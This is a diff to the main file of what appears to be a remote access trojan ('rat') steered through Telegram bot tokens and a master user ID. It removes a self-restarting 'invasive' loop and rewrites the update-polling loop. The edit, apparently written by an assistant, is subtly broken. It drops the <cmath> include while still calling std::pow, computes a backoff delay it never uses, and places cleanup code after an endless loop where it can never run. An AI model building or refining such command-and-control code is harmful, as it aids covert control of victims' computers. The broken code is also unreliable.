@@ -2,97 +2,100 @@
 #include "rat/tbot/tbot.hpp"
 #include "rat/Handler.hpp"
 #include "logging.hpp"
-#include <string>
-#include <thread>
-#include <chrono>
-#include <array>
 #include "rat/system.hpp"
-#include <cmath>
+
+#include <atomic>
+#include <chrono>
+#include <condition_variable>
+#include <csignal>
+#include <cstdint>
 #include <fmt/chrono.h>
 #include <fmt/core.h>
+#include <iostream>
+#include <mutex>
+#include <string>
+#include <thread>
 
+#ifdef _WIN32
+#  include <windows.h>
+#endif
+
+// ==============================
+// Original globals / helpers
+// ==============================
 static uint32_t empty_updates_count = 0;
-static uint32_t sleep_timout_ms = 500;
+static std::atomic<uint32_t> sleep_timeout_ms{500};
+std::string init_message;
 
-std::string init_message = "";
-
-
-static void botLoop(void);
-static void invasiveBotLoop(void);
-static bool inline _isUpdateEmpty(const rat::tbot::Update& arg_Update);
+// Forward decls
+static void botLoop();
+static inline bool _isUpdateEmpty(const ::rat::tbot::Update& arg_Update);
 static void _dynamicSleep(uint32_t arg_Count);
 
-int main(void) {
-    invasiveBotLoop();
+// ==============================
+// main
+// ==============================
+int main() {
+    botLoop();
     return 0;
 }
 
-static void invasiveBotLoop() {
-    while (true) {
-        try {
-            botLoop();
-        } catch (const std::exception& e) {
-            init_message = fmt::format("Previous bot instance crashed: {}, restarting in 5s...", e.what());
-            ERROR_LOG(init_message);
-        } catch (...) {
-            init_message = "Bot crashed due to unknown reason, restarting in 5s...";
-            ERROR_LOG(init_message);
-        }
-        std::this_thread::sleep_for(std::chrono::seconds(5));
-    }
-}
+static void botLoop() {
 
-static void botLoop(void) {
     DEBUG_LOG("Bot constructing");
-    rat::tbot::Bot     bot(TOKEN1_odahimbotzawzum, MASTER_ID);
-    rat::tbot::BaseBot backing_bot(TOKEN_ODAHIMBOT , MASTER_ID, 60);
-            
+
     if (init_message.empty()) {
         init_message = fmt::format("Session started at: {}", ::rat::system::getCurrentDateTime());
     }
 
     rat::handler::Handler session_handler;
-
+    
     session_handler.setMasterId(MASTER_ID);
     session_handler.initMainBot(TOKEN1_odahimbotzawzum);
     session_handler.initBackingBot(TOKEN_ODAHIMBOT);
-    session_handler.initCurlClient(3);
-    session_handler.initThreadPools(1, 1 ,1);
+    session_handler.initCurlClient(1);
+    session_handler.initThreadPools(1, 1);
 
     session_handler.bot->sendMessage(init_message);
 
+    empty_updates_count = 0;
+
     while (true) {
-        try {
-            ::rat::tbot::Update update = session_handler.bot->getUpdate();
-            
-            if(_isUpdateEmpty(update)) {
-                ++empty_updates_count; 
-                continue;
-            }
+        ::rat::tbot::Update update = session_handler.bot->getUpdate();
+
+
+        if (_isUpdateEmpty(update)) {
+            ++empty_updates_count;
+        } else {
             session_handler.handleUpdate(std::move(update));
-
-          
-            _dynamicSleep(empty_updates_count);
-            std::this_thread::sleep_for(std::chrono::milliseconds(sleep_timout_ms));
-
-        } catch (const std::exception& e) {
-            ERROR_LOG("Error in bot loop: {}", e.what());
-            std::this_thread::sleep_for(std::chrono::seconds(1));
         }
+
+        _dynamicSleep(empty_updates_count);
+
+
     }
+
+
+    DEBUG_LOG("Bot loop exiting — letting destructors clean up (RAII).");
+    session_handler.bot->sendMessage("The session is being destroyed");
 }
-static bool inline _isUpdateEmpty(const rat::tbot::Update& arg_Update) {
+
+// ==============================
+// Helpers
+// ==============================
+static inline bool _isUpdateEmpty(const rat::tbot::Update& arg_Update) {
     return (arg_Update.message.text.empty() && arg_Update.message.files.empty());
 }
 
 static void _dynamicSleep(uint32_t arg_Count) {
-    const uint32_t base_sleep = 500;      // Base sleep in ms
-    const double growth_factor = 1.001;    // 2% growth per empty update
-    const uint32_t max_sleep = 5000;     // Cap at 5
+    // Base/backoff are kept similar to your original
+    constexpr uint32_t base_sleep_ms = 500;
+    constexpr double   growth_factor = 1.001; // very gentle growth
+    constexpr uint32_t max_sleep_ms  = 5000;
 
-    double sleep = base_sleep * std::pow(growth_factor, arg_Count);
-    if (sleep > max_sleep) {
-        sleep = max_sleep;
-    }
-    sleep_timout_ms = static_cast<uint32_t>(sleep);
+    // compute with double then clamp
+    double computed = base_sleep_ms * std::pow(growth_factor, static_cast<double>(arg_Count));
+    if (computed > max_sleep_ms) computed = max_sleep_ms;
+
+    sleep_timeout_ms.store(static_cast<uint32_t>(computed), std::memory_order_relaxed);
 }
